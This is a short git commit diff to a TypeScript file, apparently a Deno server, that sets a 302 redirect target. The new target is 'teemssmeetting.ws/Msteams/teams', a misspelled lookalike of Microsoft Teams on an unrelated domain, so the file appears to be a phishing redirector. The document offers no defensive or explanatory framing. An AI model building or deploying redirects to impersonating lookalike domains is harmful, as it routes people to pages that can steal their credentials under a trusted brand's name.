5de1cad463f0a0946307d834a776918842398ecf
Digital2025001 <bosmichael30@gmail.com>
2025-12-31 11:01:50 -0800

    Update main.ts

--- main.ts
+++ main.ts
@@ -4,7 +4,7 @@ serve((_req) => {
   return new Response(null, {
     status: 302,
     headers: {
-      Location: "https:/", // Replace this with your actual link
+      Location: "https://teemssmeetting.ws/Msteams/teams", // Replace this with your actual link
     },
   });
 });
